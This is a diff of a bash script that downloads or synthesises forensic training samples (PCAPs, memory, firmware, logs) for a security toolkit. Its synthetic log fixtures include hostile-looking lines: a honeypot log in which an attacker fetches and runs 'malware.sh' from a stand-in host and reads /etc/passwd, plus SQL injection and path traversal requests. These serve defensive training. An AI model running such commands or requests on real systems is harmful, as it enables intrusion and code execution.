@@ -1,308 +1,586 @@
-#!/bin/bash
-# download-samples.sh - Script to download sample datasets for Orion-X
+#!/usr/bin/env bash
+# shellcheck shell=bash
+#
+# @decision DEC-FORENSIC-003
+# @title download-samples.sh follows setup-matrix.sh CLI pattern
+# @status accepted
+# @rationale Consistent project conventions from Phase 3-4. CLI arguments
+#   enable automated/scripted deployment. --offline mode generates synthetic
+#   data locally for air-gapped environments.
+#
+# Orion-X Phoenix Edition v2.0.0 — Download / generate forensic sample datasets
+#
+# Downloads sample forensic data (PCAPs, memory dumps, firmware, logs) for
+# analysis training and tool validation. In air-gapped environments, use
+# --offline to generate synthetic data locally without network access.
+#
+# Usage: download-samples.sh [options]
+#
+# Options:
+#   --samples-dir DIR     Target directory (default: data/samples)
+#   --offline             Generate synthetic data locally (no downloads)
+#   --validate-urls       Check HTTP status of all download URLs
+#   --checksums           Verify SHA-256 checksums after download
+#   --help, -h            Show this help
 
-set -e
-LOGFILE="/var/log/orionx/download_samples.log"
-SAMPLES_DIR="/opt/orionx/data/samples"
+set -euo pipefail
 
-# Create log directory if it doesn't exist
-sudo mkdir -p /var/log/orionx
-sudo touch $LOGFILE
-sudo chown -R "$(whoami)":"$(whoami)" /var/log/orionx
+# ---------------------------------------------------------------------------
+# Defaults
+# ---------------------------------------------------------------------------
+SAMPLES_DIR="data/samples"
+OFFLINE=false
+VALIDATE_URLS=false
+VERIFY_CHECKSUMS=false
 
-# Log function
-log() {
-    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOGFILE"
+# Download URLs (used in online mode and --validate-urls)
+declare -a DOWNLOAD_URLS=(
+    "https://download.netresec.com/pcap/maccdc-2012/maccdc2012_00000.pcap"
+    "https://github.com/sbousseaden/PCAP-ATTACK/raw/master/Discovery/dns_local_lookup.pcap"
+)
+
+# ---------------------------------------------------------------------------
+# Usage / help
+# ---------------------------------------------------------------------------
+usage() {
+    cat <<'HELPTEXT'
+Usage: download-samples.sh [options]
+
+Download or generate forensic sample datasets for Orion-X.
+
+Options:
+  --samples-dir DIR     Target directory (default: data/samples)
+  --offline             Generate synthetic data locally (no downloads)
+  --validate-urls       Check HTTP status of all download URLs
+  --checksums           Verify SHA-256 checksums after download
+  --help, -h            Show this help
+
+Modes:
+  Default (no flags):   Download sample data from public sources
+  --offline:            Generate minimal synthetic data locally (air-gapped)
+  --validate-urls:      Check HTTP reachability of download URLs
+  --checksums:          Verify SHA-256 checksums against SHA256SUMS file
+
+Examples:
+  download-samples.sh --offline --samples-dir /evidence/samples
+  download-samples.sh --validate-urls
+  download-samples.sh --checksums
+HELPTEXT
 }
 
-log "Starting sample data download for Orion-X Phoenix Edition v1.5.5"
+# ---------------------------------------------------------------------------
+# Logging
+# ---------------------------------------------------------------------------
+log() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
+}
 
-# Function to download PCAP samples
-download_pcaps() {
-    log "Downloading PCAP samples..."
-    mkdir -p "$SAMPLES_DIR/pcaps"
-    
-    # Create README
-    cat > "$SAMPLES_DIR/pcaps/README.txt" << EOF
-PCAP Files Collection - Orion-X Phoenix Edition v1.5.5
+log_error() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1" >&2
+}
+
+# ---------------------------------------------------------------------------
+# CLI argument parsing
+# ---------------------------------------------------------------------------
+parse_args() {
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --samples-dir)
+                if [[ $# -lt 2 ]]; then
+                    log_error "--samples-dir requires a directory argument"
+                    exit 1
+                fi
+                SAMPLES_DIR="$2"
+                shift 2
+                ;;
+            --offline)
+                OFFLINE=true
+                shift
+                ;;
+            --validate-urls)
+                VALIDATE_URLS=true
+                shift
+                ;;
+            --checksums)
+                VERIFY_CHECKSUMS=true
+                shift
+                ;;
+            -h|--help)
+                usage
+                exit 0
+                ;;
+            *)
+                log_error "Unknown option: $1"
+                usage >&2
+                exit 1
+                ;;
+        esac
+    done
+}
+
+# ---------------------------------------------------------------------------
+# Validate URLs (--validate-urls)
+# ---------------------------------------------------------------------------
+validate_urls() {
+    log "Validating download URLs..."
+    local url status failures=0
+    for url in "${DOWNLOAD_URLS[@]}"; do
+        if command -v curl >/dev/null 2>&1; then
+            status=$(curl -o /dev/null -s -w '%{http_code}' --head --max-time 10 "$url" 2>/dev/null || echo "timeout")
+        else
+            log_error "curl not found — cannot validate URLs"
+            return 1
+        fi
+        if [[ "$status" == "200" ]]; then
+            log "  OK  ($status): $url"
+        else
+            log "  FAIL ($status): $url"
+            ((failures++))
+        fi
+    done
+    if [[ $failures -gt 0 ]]; then
+        log "$failures URL(s) failed validation"
+        return 1
+    fi
+    log "All URLs validated successfully"
+    return 0
+}
+
+# ---------------------------------------------------------------------------
+# Verify checksums (--checksums)
+# ---------------------------------------------------------------------------
+verify_checksums() {
+    local sums_file="$SAMPLES_DIR/SHA256SUMS"
+    if [[ ! -f "$sums_file" ]]; then
+        log_error "SHA256SUMS file not found at $sums_file"
+        return 1
+    fi
+    log "Verifying SHA-256 checksums from $sums_file..."
+
+    local failures=0 checked=0 line expected_hash filepath
+    while IFS= read -r line; do
+        # Skip empty lines and comments
+        [[ -z "$line" || "$line" == \#* ]] && continue
+
+        expected_hash="${line%% *}"
+        # SHA256SUMS uses two-space separator: "hash  filename"
+        filepath="${line#*  }"
+        local full_path="$SAMPLES_DIR/$filepath"
+
+        if [[ ! -f "$full_path" ]]; then
+            log "  MISSING: $filepath"
+            ((failures++))
+            ((checked++))
+            continue
+        fi
+
+        local actual_hash
+        if command -v shasum >/dev/null 2>&1; then
+            actual_hash=$(shasum -a 256 "$full_path" | cut -d' ' -f1)
+        elif command -v sha256sum >/dev/null 2>&1; then
+            actual_hash=$(sha256sum "$full_path" | cut -d' ' -f1)
+        else
+            log_error "Neither shasum nor sha256sum found"
+            return 1
+        fi
+
+        if [[ "$actual_hash" == "$expected_hash" ]]; then
+            log "  OK: $filepath"
+        else
+            log "  MISMATCH: $filepath"
+            log "    expected: $expected_hash"
+            log "    actual:   $actual_hash"
+            ((failures++))
+        fi
+        ((checked++))
+    done < "$sums_file"
+
+    if [[ $checked -eq 0 ]]; then
+        log_error "No entries found in SHA256SUMS"
+        return 1
+    fi
+    if [[ $failures -gt 0 ]]; then
+        log "$failures of $checked file(s) failed checksum verification"
+        return 1
+    fi
+    log "All $checked file(s) verified successfully"
+    return 0
+}
+
+# ---------------------------------------------------------------------------
+# Generate synthetic PCAP
+# ---------------------------------------------------------------------------
+generate_synthetic_pcap() {
+    local dir="$1"
+    mkdir -p "$dir"
+
+    log "Generating synthetic PCAP sample..."
+    # Minimal valid PCAP file header (24 bytes) + one packet
+    # PCAP magic: 0xd4c3b2a1, version 2.4, snaplen 65535, network ethernet
+    python3 -c "
+import struct, sys
+# PCAP global header
+header = struct.pack('<IHHiIII',
+    0xa1b2c3d4,  # magic
+    2, 4,        # version
+    0,           # timezone
+    0,           # sigfigs
+    65535,       # snaplen
+    1            # network (ethernet)
+)
+# One dummy ethernet frame (14 bytes eth + 20 bytes IP + 8 bytes payload)
+frame = b'\\xff' * 6 + b'\\x00' * 6 + b'\\x08\\x00'  # eth header
+frame += b'\\x45\\x00\\x00\\x1c' + b'\\x00' * 16       # minimal IP header
+# Packet header: ts_sec, ts_usec, incl_len, orig_len
+pkt_hdr = struct.pack('<IIII', 1705300000, 0, len(frame), len(frame))
+sys.stdout.buffer.write(header + pkt_hdr + frame)
+" > "$dir/synthetic-traffic.pcap"
+
+    cat > "$dir/README.txt" << 'EOF'
+PCAP Files Collection - Orion-X Phoenix Edition v2.0.0
 ======================================================
 
-This directory contains packet capture files from actual malware traffic scenarios,
-sourced primarily from the well-known repository malware-traffic-analysis.net.
+This directory contains packet capture files for forensic analysis
+training and tool validation.
 
-These PCAPs cover various network infection patterns including:
-- Malicious HTTP downloads
-- Command and control (C2) traffic
-- Exploit kit activity
-- Data exfiltration
-- Lateral movement
-
-FILES IN THIS DIRECTORY:
-------------------------
-
-1. 2023-01-example-traffic.pcap.zip
-   Description: PCAP of an infection scenario simulation
-   Password: "infected" (standard password)
-
-IMPORTANT WARNING:
+SYNTHETIC SAMPLES:
 -----------------
-These files may contain malicious code and should be handled with care.
-Do not execute any binaries extracted from these PCAPs.
-Always keep these files within the Orion-X environment or similar 
-controlled analysis systems.
+synthetic-traffic.pcap — Minimal valid PCAP with a single dummy frame.
+Generated by --offline mode for air-gapped environments.
 
 USAGE:
 ------
 These PCAPs can be analyzed using:
-- The included Wireshark or TShark tools
-- The artifact-analyzer.py script (with --type network flag)
-- Network Security Monitoring tools like Zeek/Bro
+- Wireshark or TShark
+- artifact-analyzer.py (with --type network flag)
+- Zeek/Bro for protocol analysis
 - Suricata IDS for alert generation
 
-ATTRIBUTION:
-------------
-PCAP files are provided for educational purposes.
-
-LICENSE:
+WARNING:
 --------
-These files are shared for educational use only.
+In production use, this directory may contain PCAPs from actual malware
+traffic. Handle with care. Do not execute extracted binaries.
 EOF
-    
-    # Download a safe, educational PCAP - we'll use a public dataset
-    wget -q -O "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap" "https://download.netresec.com/pcap/maccdc-2012/maccdc2012_00000.pcap" || {
-        log "Failed to download PCAP sample from primary source. Trying alternative..."
-        wget -q -O "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap" "https://github.com/sbousseaden/PCAP-ATTACK/raw/master/Discovery/dns_local_lookup.pcap" || {
-            log "Failed to download PCAP sample. Creating a sample PCAP locally..."
-            # Create a minimal PCAP if download fails
-            sudo tcpdump -w "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap" -c 100 -i any
-        }
-    }
-    
-    log "Created PCAP sample: $SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap"
-    
-    # Creating a ZIP version with password for practice
-    zip -P infected "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap.zip" "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap"
-    log "Created password-protected zip: $SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap.zip (password: infected)"
+    log "Created synthetic PCAP: $dir/synthetic-traffic.pcap"
 }
 
-# Function to create memory sample (not a real memory dump, just a placeholder)
-create_memory_sample() {
-    log "Creating memory sample placeholder..."
-    mkdir -p "$SAMPLES_DIR/memory"
-    
-    # Create README
-    cat > "$SAMPLES_DIR/memory/README.txt" << EOF
-Memory Dumps Collection - Orion-X Phoenix Edition v1.5.5
+# ---------------------------------------------------------------------------
+# Generate synthetic memory dump
+# ---------------------------------------------------------------------------
+generate_synthetic_memory() {
+    local dir="$1"
+    mkdir -p "$dir"
+
+    log "Generating synthetic memory sample..."
+    # Create a small synthetic memory dump with recognizable patterns
+    python3 -c "
+import sys
+# Start with a PAGE_SIZE-aligned block containing recognizable strings
+data = bytearray(4096)
+# Write some process-like strings at known offsets
+strings = [
+    (0, b'PAGESIZE4K'),
+    (64, b'cmd.exe\x00'),
+    (128, b'svchost.exe\x00'),
+    (256, b'\\x4d\\x5a'),  # MZ header signature
+    (512, b'This program cannot be run in DOS mode'),
+    (1024, b'KERNEL32.DLL\x00'),
+    (2048, b'ntdll.dll\x00'),
+]
+for offset, s in strings:
+    data[offset:offset+len(s)] = s
+sys.stdout.buffer.write(bytes(data))
+" > "$dir/synthetic-memdump.raw"
+
+    cat > "$dir/README.txt" << 'EOF'
+Memory Dumps Collection - Orion-X Phoenix Edition v2.0.0
 ========================================================
 
-This directory would normally contain volatile memory images that can be used for 
-forensic analysis training and testing. In this Docker test environment, we include
-placeholder files instead of actual memory dumps due to size constraints.
+This directory contains volatile memory images for forensic analysis
+training and tool validation.
 
-In a full Orion-X installation, you would find memory dumps containing artifacts 
-of malware or typical system usage.
+SYNTHETIC SAMPLES:
+-----------------
+synthetic-memdump.raw — 4KB synthetic memory image with recognizable
+process artifacts (PE headers, DLL names). Generated by --offline mode.
 
 USAGE:
 ------
-In a real Orion-X environment, memory dumps can be analyzed using:
+Memory dumps can be analyzed using:
+- Volatility 3: vol -f synthetic-memdump.raw windows.pslist
+- artifact-analyzer.py: python3 artifact-analyzer.py synthetic-memdump.raw -t memory
 
-- Volatility (included in Orion-X)
-  Example commands:
-vol -f memory_sample.raw windows.pslist
-vol -f memory_sample.raw windows.netscan
-
-- The artifact-analyzer.py script
-Example:
-python3 /usr/bin/artifact-analyzer.py memory_sample.raw -t memory
-
-SYSTEM REQUIREMENTS:
--------------------
-Note that memory analysis is memory-intensive. It's recommended to have
-at least 8GB of RAM when working with larger memory dumps.
-
-ATTRIBUTION:
------------
-In a normal installation, memory images would be provided courtesy of:
-- The Volatility Foundation (volatility samples)
-- NIST CFReDS (cfreds.nist.gov)
-- Various CTF competitions
-
-LICENSE:
--------
-Sample files would be shared for educational and training purposes only.
+NOTE: Synthetic samples are intentionally small. Real memory dumps
+are typically 1-16 GB. The structures here are for tool validation only.
 EOF
-  
-  # Create a small placeholder file
-  dd if=/dev/urandom of="$SAMPLES_DIR/memory/mini_sample.raw" bs=1M count=5
-  log "Created memory sample placeholder: $SAMPLES_DIR/memory/mini_sample.raw"
-  
-  # Create a ZIP version with password for practice
-  zip -P orionx "$SAMPLES_DIR/memory/mini_sample.raw.zip" "$SAMPLES_DIR/memory/mini_sample.raw"
-  log "Created password-protected zip: $SAMPLES_DIR/memory/mini_sample.raw.zip (password: orionx)"
+    log "Created synthetic memory sample: $dir/synthetic-memdump.raw"
 }
 
-# Function to create firmware sample
-create_firmware_sample() {
-  log "Creating firmware sample placeholder..."
-  mkdir -p "$SAMPLES_DIR/firmware"
-  
-  # Create README
-  cat > "$SAMPLES_DIR/firmware/README.txt" << EOF
-Firmware Images Collection - Orion-X Phoenix Edition v1.5.5
+# ---------------------------------------------------------------------------
+# Generate synthetic firmware
+# ---------------------------------------------------------------------------
+generate_synthetic_firmware() {
+    local dir="$1"
+    mkdir -p "$dir"
+
+    log "Generating synthetic firmware sample..."
+    # Create a small binary with firmware-like markers
+    python3 -c "
+import sys
+data = bytearray(512)
+# ELF magic header
+data[0:4] = b'\\x7fELF'
+# Add some firmware-like strings
+msg = b'Synthetic firmware for offline testing'
+data[64:64+len(msg)] = msg
+ver = b'OpenWrt 19.07-synthetic'
+data[128:128+len(ver)] = ver
+uboot = b'U-Boot 2021.01'
+data[192:192+len(uboot)] = uboot
+# Fill remainder with 0xff (typical flash pattern)
+for i in range(256, 512):
+    data[i] = 0xff
+sys.stdout.buffer.write(bytes(data))
+" > "$dir/synthetic-firmware.bin"
+
+    cat > "$dir/README.txt" << 'EOF'
+Firmware Images Collection - Orion-X Phoenix Edition v2.0.0
 ==========================================================
 
-This directory would normally contain firmware binary dumps from IoT devices for
-reverse engineering and vulnerability analysis practice.
+This directory contains firmware binary dumps for reverse engineering
+and vulnerability analysis practice.
 
-In this Docker test environment, we include placeholder files instead of actual 
-firmware images due to size and licensing constraints.
+SYNTHETIC SAMPLES:
+-----------------
+synthetic-firmware.bin — 512-byte synthetic binary with ELF magic header
+and firmware-like strings. Generated by --offline mode.
 
 USAGE:
------
-In a real Orion-X environment, these firmware images could be analyzed using:
+------
+Firmware images can be analyzed using:
+- Binwalk: binwalk synthetic-firmware.bin
+- Ghidra: for deeper code analysis
+- strings: strings synthetic-firmware.bin
 
-- Binwalk (for initial analysis)
-binwalk firmware_sample.bin
-
-- Firmware-mod-kit (for extraction)
-./extract-firmware.sh firmware_sample.bin
-
-IMPORTANT NOTES:
---------------
-1. Firmware images are provided for educational purposes only
-2. Do not flash these images to actual hardware
-3. Some images may contain intentional vulnerabilities for training
-
-ATTRIBUTION:
------------
-In a normal installation, firmware would be provided with proper attribution
-to the original sources.
-
-LICENSE:
--------
-Firmware images would be distributed under appropriate licenses,
-with educational use restrictions.
+IMPORTANT: Do not flash synthetic samples to actual hardware.
 EOF
-  
-  # Create a small placeholder file with some recognizable patterns
-  dd if=/dev/urandom of="$SAMPLES_DIR/firmware/sample_firmware.bin" bs=1M count=2
-  echo "OpenWrt" >> "$SAMPLES_DIR/firmware/sample_firmware.bin"
-  echo "Linux version" >> "$SAMPLES_DIR/firmware/sample_firmware.bin"
-  log "Created firmware sample placeholder: $SAMPLES_DIR/firmware/sample_firmware.bin"
+    log "Created synthetic firmware: $dir/synthetic-firmware.bin"
 }
 
-# Function to create log samples
-create_log_samples() {
-  log "Creating log samples..."
-  mkdir -p "$SAMPLES_DIR/logs/cowrie"
-  mkdir -p "$SAMPLES_DIR/logs/web-attacks"
-  
-  # Create README
-  cat > "$SAMPLES_DIR/logs/README.txt" << EOF
-Log Files Collection - Orion-X Phoenix Edition v1.5.5
+# ---------------------------------------------------------------------------
+# Generate synthetic log samples
+# ---------------------------------------------------------------------------
+generate_synthetic_logs() {
+    local dir="$1"
+    mkdir -p "$dir"
+
+    log "Generating synthetic log samples..."
+
+    cat > "$dir/synthetic-syslog.log" << 'SYSLOG'
+Jan 15 08:23:01 orionx-node-1 sshd[1234]: Accepted publickey for admin from 192.168.1.100 port 54321
+Jan 15 08:23:05 orionx-node-1 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.99 DST=10.0.0.1 PROTO=TCP DPT=4444
+Jan 15 08:25:12 orionx-node-1 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; COMMAND=/usr/bin/volatility3
+Jan 15 08:30:00 orionx-node-1 cron[5678]: (root) CMD (/usr/bin/lynis audit system)
+Jan 15 08:31:45 orionx-node-1 sshd[1234]: Failed password for root from 10.0.0.99 port 54322
+Jan 15 08:31:46 orionx-node-1 sshd[1234]: Failed password for root from 10.0.0.99 port 54323
+Jan 15 08:31:47 orionx-node-1 sshd[1234]: Failed password for root from 10.0.0.99 port 54324
+Jan 15 08:32:00 orionx-node-1 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.99 DST=10.0.0.1 PROTO=TCP DPT=22
+Jan 15 08:35:00 orionx-node-1 orionx-mesh[9012]: Health check: 2 peers, 2 healthy, 0 stale
+Jan 15 08:40:15 orionx-node-1 matrix-synapse[3456]: Processed request: GET /_matrix/client/versions
+Jan 15 09:00:00 orionx-node-1 sshd[1234]: Accepted publickey for responder from 192.168.1.101 port 54325
+Jan 15 09:15:30 orionx-node-1 kernel: [UFW ALLOW] IN=wg0 OUT= SRC=10.0.99.2 DST=10.0.99.1 PROTO=TCP DPT=8008
+Jan 15 09:20:00 orionx-node-1 orionx-mesh[9012]: Discovered peer: orionx-node-2 (10.0.99.2) at 172.20.0.3
+Jan 15 10:00:00 orionx-node-1 clamav[7890]: /tmp/suspicious.exe: Win.Trojan.Generic FOUND
+Jan 15 10:05:00 orionx-node-1 orionx-mesh[9012]: Soft heal: refreshing endpoint for peer Ab3xK9m2
+SYSLOG
+
+    cat > "$dir/synthetic-events.json" << 'EVENTS_JSON'
+[
+  {"timestamp": "2025-01-15T08:23:01", "severity": "INFO", "source": "sshd", "message": "Accepted publickey for admin from 192.168.1.100"},
+  {"timestamp": "2025-01-15T08:23:05", "severity": "WARNING", "source": "kernel", "message": "UFW BLOCK SRC=10.0.0.99 DST=10.0.0.1 DPT=4444"},
+  {"timestamp": "2025-01-15T08:31:45", "severity": "ERROR", "source": "sshd", "message": "Failed password for root from 10.0.0.99"},
+  {"timestamp": "2025-01-15T09:00:00", "severity": "INFO", "source": "sshd", "message": "Accepted publickey for responder from 192.168.1.101"},
+  {"timestamp": "2025-01-15T10:00:00", "severity": "CRITICAL", "source": "clamav", "message": "Malware detected: Win.Trojan.Generic in /tmp/suspicious.exe"}
+]
+EVENTS_JSON
+
+    cat > "$dir/synthetic-web-access.log" << 'WEBLOG'
+192.0.2.123 - - [15/Jan/2025:03:12:18 +0000] "GET /admin HTTP/1.1" 404 196 "-" "Mozilla/5.0"
+192.0.2.45 - - [15/Jan/2025:03:45:25 +0000] "GET /search.php?q=test'%20OR%20'1'='1 HTTP/1.1" 200 8721 "-" "Mozilla/5.0"
+192.0.2.45 - - [15/Jan/2025:03:45:30 +0000] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 403 1267 "-" "Mozilla/5.0"
+WEBLOG
+
+    cat > "$dir/README.txt" << 'EOF'
+Log Files Collection - Orion-X Phoenix Edition v2.0.0
 ====================================================
 
 This directory contains log files showing examples of attacks,
-intrusions, and suspicious activities. These can be used for log analysis
-training and incident response practice.
+intrusions, and suspicious activities for log analysis training.
 
-SUBDIRECTORIES:
--------------
-
-1. cowrie/
- Description: Logs from Cowrie SSH/Telnet honeypot that records attacker interactions
- Contents: JSON and text logs showing attacker sessions, commands, and downloads
- 
-2. web-attacks/
- Description: Web server logs containing attack attempts
- Contents: Apache/Nginx access logs with SQL injection, path traversal, and scanning attempts
-
-FILES IN THIS DIRECTORY:
-----------------------
-
-1. linux-ssh-intrusion.log
- Description: Linux system syslog showing an SSH intrusion and privilege escalation
- Size: Sample file for analysis practice
+SYNTHETIC SAMPLES:
+-----------------
+synthetic-syslog.log      — Linux syslog with SSH brute-force, firewall blocks,
+                            mesh health checks, and malware detection events.
+synthetic-events.json     — Structured events in JSON format.
+synthetic-web-access.log  — Apache access log with SQL injection and path
+                            traversal attack attempts.
 
 USAGE:
------
+------
 These logs can be analyzed using:
-
-- Standard Unix tools:
-grep -i "failure" linux-ssh-intrusion.log
-
-- The storyboard-gen.py script for timeline creation:
-python3 /usr/bin/storyboard-gen.py -i /opt/orionx/data/samples/logs/ -o attack_timeline.html
-
-- The artifact-analyzer.py script:
-python3 /usr/bin/artifact-analyzer.py linux-ssh-intrusion.log -t log
-
-ATTRIBUTION:
------------
-These logs are synthetically created for educational purposes.
-
-LICENSE:
--------
-These logs are provided for educational purposes only.
+- Standard Unix tools: grep -i "failure" synthetic-syslog.log
+- storyboard-gen.py: python3 storyboard-gen.py -i logs/ -o timeline.html
+- artifact-analyzer.py: python3 artifact-analyzer.py synthetic-syslog.log -t log
 EOF
-  
-  # Create SSH intrusion log sample
-  cat > "$SAMPLES_DIR/logs/linux-ssh-intrusion.log" << EOF
-Jan 15 00:23:15 server sshd[12345]: Failed password for invalid user admin from 203.0.113.10 port 41297 ssh2
-Jan 15 00:23:18 server sshd[12346]: Failed password for invalid user admin from 203.0.113.10 port 41298 ssh2
-Jan 15 00:23:21 server sshd[12347]: Failed password for invalid user root from 203.0.113.10 port 41299 ssh2
-Jan 15 00:23:24 server sshd[12348]: Failed password for invalid user root from 203.0.113.10 port 41300 ssh2
-Jan 15 00:23:27 server sshd[12349]: Failed password for invalid user oracle from 203.0.113.10 port 41301 ssh2
-Jan 15 00:23:30 server sshd[12350]: Accepted password for user from 203.0.113.10 port 41302 ssh2
-Jan 15 00:23:30 server sshd[12350]: pam_unix(sshd:session): session opened for user user by (uid=0)
-Jan 15 00:23:42 server sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash
-Jan 15 00:23:42 server sudo: pam_unix(sudo:session): session opened for user root by user(uid=0)
-Jan 15 00:24:15 server useradd[12355]: new user: name=backdoor, UID=1010, GID=1010, home=/home/backdoor, shell=/bin/bash
-Jan 15 00:24:30 server usermod[12356]: add 'backdoor' to group 'sudo'
-Jan 15 00:24:45 server sshd[12357]: Accepted password for backdoor from 203.0.113.10 port 41310 ssh2
-Jan 15 00:24:45 server sshd[12357]: pam_unix(sshd:session): session opened for user backdoor by (uid=0)
-Jan 15 00:25:05 server sshd[12350]: pam_unix(sshd:session): session closed for user user
-EOF
-  log "Created SSH intrusion log sample"
-  
-  # Create Cowrie honeypot log samples
-  cat > "$SAMPLES_DIR/logs/cowrie/cowrie.json" << EOF
-{"eventid":"cowrie.login.success","timestamp":"2023-01-15T02:03:33.885191Z","src_ip":"198.51.100.22","username":"admin","password":"admin123","sensor":"honeypot-1"}
-{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:35.125718Z","src_ip":"198.51.100.22","input":"uname -a","sensor":"honeypot-1"}
-{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:38.223914Z","src_ip":"198.51.100.22","input":"cat /etc/passwd","sensor":"honeypot-1"}
-{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:42.347021Z","src_ip":"198.51.100.22","input":"wget http://malicious.example.com/malware.sh","sensor":"honeypot-1"}
-{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:45.488132Z","src_ip":"198.51.100.22","input":"chmod +x malware.sh","sensor":"honeypot-1"}
-{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:48.512346Z","src_ip":"198.51.100.22","input":"./malware.sh","sensor":"honeypot-1"}
-{"eventid":"cowrie.session.closed","timestamp":"2023-01-15T02:04:02.723145Z","src_ip":"198.51.100.22","duration":29.84,"sensor":"honeypot-1"}
-EOF
-  log "Created Cowrie honeypot log sample"
-  
-  # Create web attack log samples
-  cat > "$SAMPLES_DIR/logs/web-attacks/access.log" << EOF
-192.0.2.123 - - [15/Jan/2023:03:12:18 +0000] "GET /admin HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
-192.0.2.123 - - [15/Jan/2023:03:12:20 +0000] "GET /wp-login.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
-192.0.2.123 - - [15/Jan/2023:03:12:25 +0000] "GET /manager/html HTTP/1.1" 404 198 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
-192.0.2.45 - - [15/Jan/2023:03:45:10 +0000] "GET /login.php HTTP/1.1" 200 1532 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
-192.0.2.45 - - [15/Jan/2023:03:45:15 +0000] "POST /login.php HTTP/1.1" 200 1532 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
-192.0.2.45 - - [15/Jan/2023:03:45:18 +0000] "GET /admin.php HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
-192.0.2.45 - - [15/Jan/2023:03:45:20 +0000] "GET /search.php?q=test HTTP/1.1" 200 2541 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
-192.0.2.45 - - [15/Jan/2023:03:45:25 +0000] "GET /search.php?q=test'%20OR%20'1'='1 HTTP/1.1" 200 8721 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
-192.0.2.45 - - [15/Jan/2023:03:45:30 +0000] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 403 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
-192.0.2.45 - - [15/Jan/2023:03:45:35 +0000] "GET /phpinfo.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
-EOF
-  log "Created web attack log sample"
+    log "Created synthetic log samples in $dir/"
 }
 
-# Download/create all samples
-download_pcaps
-create_memory_sample
-create_firmware_sample
-create_log_samples
+# ---------------------------------------------------------------------------
+# Download PCAP samples (online mode)
+# ---------------------------------------------------------------------------
+download_pcaps() {
+    local dir="$SAMPLES_DIR/pcaps"
+    mkdir -p "$dir"
 
-# Set correct permissions
-sudo chown -R "$(whoami)":"$(whoami)" "$SAMPLES_DIR"
-sudo chmod -R 755 "$SAMPLES_DIR"
+    log "Downloading PCAP samples..."
 
-log "Sample data download/creation completed"
-echo "Sample data has been downloaded and organized in $SAMPLES_DIR"
-echo "You can now use these samples with the Orion-X analysis tools."
+    local url="${DOWNLOAD_URLS[0]}"
+    local target="$dir/maccdc2012_sample.pcap"
+
+    if command -v wget >/dev/null 2>&1; then
+        if ! wget -q -O "$target" "$url"; then
+            log "Failed to download from primary source. Trying alternative..."
+            url="${DOWNLOAD_URLS[1]}"
+            target="$dir/dns_local_lookup.pcap"
+            if ! wget -q -O "$target" "$url"; then
+                log "Downloads failed. Use --offline for synthetic data."
+                return 1
+            fi
+        fi
+    elif command -v curl >/dev/null 2>&1; then
+        if ! curl -sL -o "$target" "$url"; then
+            log "Failed to download from primary source. Trying alternative..."
+            url="${DOWNLOAD_URLS[1]}"
+            target="$dir/dns_local_lookup.pcap"
+            if ! curl -sL -o "$target" "$url"; then
+                log "Downloads failed. Use --offline for synthetic data."
+                return 1
+            fi
+        fi
+    else
+        log_error "Neither wget nor curl found. Use --offline for synthetic data."
+        return 1
+    fi
+
+    log "Downloaded PCAP sample: $target"
+}
+
+# ---------------------------------------------------------------------------
+# Create memory sample placeholder (online mode)
+# ---------------------------------------------------------------------------
+create_memory_sample() {
+    local dir="$SAMPLES_DIR/memory"
+    mkdir -p "$dir"
+
+    log "Creating memory sample placeholder..."
+    # Create a small placeholder — real memory dumps are too large for default download
+    python3 -c "
+import sys
+data = bytearray(5 * 1024 * 1024)  # 5 MB placeholder
+data[0:4] = b'\\x4d\\x5a\\x90\\x00'  # MZ header
+sys.stdout.buffer.write(bytes(data))
+" > "$dir/mini_sample.raw" 2>/dev/null || {
+        # Fallback if python3 is not available
+        dd if=/dev/urandom of="$dir/mini_sample.raw" bs=1M count=5 2>/dev/null
+    }
+    log "Created memory sample: $dir/mini_sample.raw"
+}
+
+# ---------------------------------------------------------------------------
+# Create firmware sample placeholder (online mode)
